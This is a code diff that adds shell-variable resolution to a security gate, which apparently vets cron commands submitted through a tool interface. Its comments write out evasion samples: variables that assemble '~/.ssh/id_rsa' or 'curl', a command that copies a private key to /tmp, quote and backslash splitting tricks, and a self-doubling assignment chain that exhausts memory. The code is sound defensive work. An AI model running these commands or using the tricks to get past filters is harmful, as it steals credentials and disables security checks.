@@ -3800,3 +3800,155 @@ def normalize_shell_command(cmd: str) -> list[str]:
         resolved.append(token)
 
     return resolved
+
+
+# ── Local variable assignments ──
+# A shell assignment earlier in a command is visible to every later ``$NAME`` /
+# ``${NAME}`` in the same command, so a name or a path fragment can be assembled
+# out of pieces the text never shows adjacent: `A=.s; B=sh; cp ~/$A$B/id_rsa ...`
+# reads ``~/.ssh/id_rsa``, and `A=cu; B=rl; $A$B -d @f URL` runs ``curl``. A
+# matcher that reads the text as written sees neither; the resolver below hands
+# it the string the shell assembles. Read by the cron command vet and by the
+# always-on exfiltration gate's program-token check.
+#
+# Two shapes both set variables and BOTH must be captured. Anchoring only at
+# start-of-command / after a separator catches the first shape but stops at the
+# first token of the second, leaving later names unresolved:
+#
+#   A=.s; B=sh; ...   separate commands   — one assignment per anchor
+#   A=.s B=sh ...     an assignment LIST  — whitespace-separated, ONE command
+#                     (verified: `sh -c 'A=.s B=sh; echo "[$A][$B]"'` -> [.s][sh])
+#
+def _iter_local_assignments(text: str) -> Iterator[tuple[str, str]]:
+    """Yield the conservative assignment scan's name/value pairs in source order."""
+    for word in re.split(r"[;&|\s]+", text):
+        name, separator, value = word.partition("=")
+        # ASCII identifiers are exactly the shell NAME grammar. Partition at
+        # the first '=' once; failed names cannot restart a pattern search.
+        # ``cp a=b`` still conservatively counts as an assignment for scanning.
+        if separator and name.isascii() and name.isidentifier():
+            yield name, value
+
+
+# A backslash escaping any character. sh drops the backslash and keeps the
+# character during word expansion, so the scan must do the same to see the string
+# the shell will actually use.
+_BACKSLASH_ESCAPE_RE = re.compile(r"\\(.)", re.DOTALL)
+#: Cap on one resolved assignment value. Chained self-references double per
+#: assignment, so this is what keeps a hostile `cron_add` from OOM-killing the
+#: gateway out of a vetting gate. Set to the cron `command` field's max_len: a
+#: value cannot legitimately exceed the string it was parsed out of.
+_MAX_LOCAL_ASSIGNMENT_VALUE = 5000
+#: Cap on tracked assignments. `_expand` rewrites a segment once per known name,
+#: so cost is O(names x segments) — with the value cap alone, 700 chained
+#: assignments still measured 97s. Far above any real one-liner; past it the
+#: extra names simply go unresolved, which cannot admit a payload (an unresolved
+#: `$X` stays literal and so cannot match a credential path).
+_MAX_LOCAL_ASSIGNMENTS = 64
+
+
+def _split_segments_keeping_separators(command: str) -> list[tuple[str, str]]:
+    """Split *command* on shell command separators, keeping each separator.
+
+    Returns ``(segment, separator)`` pairs whose concatenation reproduces the
+    input exactly, so a caller can expand each segment independently and rejoin
+    without altering anything it did not intend to. Splitting on `;`/`&`/`|` runs
+    is coarse — it does not respect quoting — but it only ever makes a scan
+    consider a NARROWER environment per segment, never a wider one, so a
+    mis-split cannot admit a payload.
+    """
+    parts: list[tuple[str, str]] = []
+    pos = 0
+    for m in re.finditer(r"[;&|]+", command):
+        parts.append((command[pos : m.start()], m.group(0)))
+        pos = m.end()
+    parts.append((command[pos:], ""))
+    return parts
+
+
+def _substitute_local_assignments(command: str) -> str:
+    """Return *command* with any locally-assigned ``$var``/``${var}`` expanded.
+
+    A shell assignment earlier in the string (``A=.ssh; ...``) is visible to
+    later ``$A`` / ``${A}`` references in the same command, so a static scan of
+    the text sees the assembled string only if it performs the same substitution
+    first. Only LOCAL assignments in this command are resolved -- an unknown
+    variable is left as written, so a scan that follows must not treat an
+    unresolved ``$var`` as innocuous; it simply cannot make a literal matcher
+    match at scan time, which is the point.
+    """
+
+    def _expand(text: str, env: dict[str, str]) -> str:
+        """Replace every ``$NAME`` / ``${NAME}`` known to *env*, longest name first.
+
+        Longest-first so ``$AB`` is never matched by the rule for ``$A``.
+        """
+        for name in sorted(env, key=len, reverse=True):
+            # A CALLABLE replacement, never the string: re.sub reads backslashes
+            # in a string replacement as escapes, so a value like `\q` raises
+            # re.error ("bad escape") and would abort the whole cron_add MCP call
+            # — a vetting gate that crashes on hostile input is worse than one
+            # that misses it. A callable is substituted literally.
+            literal = env[name]
+            repl = lambda _m, v=literal: v  # noqa: E731 - one-line literal repl
+            text = re.sub(r"\$\{" + re.escape(name) + r"\}", repl, text)
+            text = re.sub(r"\$" + re.escape(name) + r"(?![A-Za-z0-9_])", repl, text)
+        return text
+
+    # Resolve SEQUENTIALLY, in source order, expanding each value against the
+    # state at that point — which is what sh does. A name/value map plus a
+    # fixpoint cannot model this, because it keeps only the LAST value per name
+    # and so loses the intermediate one a later variable captured:
+    #
+    #   A=.s; B=$A; A=x; C=sh; cp ~/${B}${C}/id_rsa
+    #
+    # `B` captures `.s` BEFORE `A` is reassigned, so sh reads `.ssh` (verified),
+    # while a last-value map resolves B to `x` and scans a harmless `~/xsh/`.
+    # Sequential resolution also removes the need for a fixpoint loop and its
+    # cycle cap: a value can only ever reference names already assigned, so one
+    # left-to-right pass is complete by construction.
+    # Each SEGMENT is expanded with the environment as it stands at that segment,
+    # then the expanded segments are rejoined. Expanding the whole command with
+    # the FINAL environment would let a trailing reassignment hide an earlier
+    # read — `A=.ssh; cp ~/$A/id_rsa /tmp/key; A=safe` scans as `~/safe/id_rsa`
+    # while sh copies the key, because sh evaluates `$A` when it reaches that
+    # command, not after the last one.
+    env: dict[str, str] = {}
+    out: list[str] = []
+    for segment, separator in _split_segments_keeping_separators(command):
+        for name, value in _iter_local_assignments(segment):
+            # Quote removal deletes EVERY quote character in the word, not just a
+            # surrounding pair: sh reads `A=.s''sh` as `.ssh` (verified), and an
+            # INTERNAL empty pair is the cheapest way to split a credential
+            # directory name across characters the scan can never see adjacent.
+            # A value is treated as single-quoted for expansion purposes only when
+            # the WHOLE word is one single-quoted run — that is the case in which
+            # sh performs neither parameter expansion nor escape removal on it.
+            wholly_single_quoted = (
+                len(value) >= 2 and value[0] == value[-1] == "'" and "'" not in value[1:-1]
+            )
+            value = value.replace('"', "").replace("'", "")
+            if not wholly_single_quoted:
+                # sh REMOVES an escaping backslash during word expansion, so
+                # `B=s\h` sets B to `sh` — and `~/$A$B` then reads `.ssh` while
+                # the literal text carried `.ss\h`, which the credential-path
+                # regex does not match. Quote removal is part of expansion, so it
+                # has to happen here too or the scan sees a different string than
+                # the shell does. Inside SINGLE quotes a backslash is literal, so
+                # that case is left alone.
+                value = _BACKSLASH_ESCAPE_RE.sub(r"\1", value)
+                # A single-quoted value is also not subject to parameter
+                # expansion, hence expanding only on this branch.
+                value = _expand(value, env)
+            # Bound the stored value. Each assignment can reference earlier ones,
+            # so `A0=ab; A1=$A0$A0; A2=$A1$A1; ...` DOUBLES per assignment —
+            # measured 67 MB at 24 assignments, and the `command` field allows
+            # 5000 chars (~700 assignments), which is ~1 TiB. That OOM-kills the
+            # single-process gateway from inside a gate whose whole job is to
+            # REFUSE hostile input, and it happens before the credential scan
+            # runs at all. Truncating can only narrow what the scan sees, never
+            # widen it, and no legitimate value exceeds the field's own cap.
+            if len(env) < _MAX_LOCAL_ASSIGNMENTS or name in env:
+                env[name] = value[:_MAX_LOCAL_ASSIGNMENT_VALUE]
+        out.append(_expand(segment, env) + separator)
+    return "".join(out)
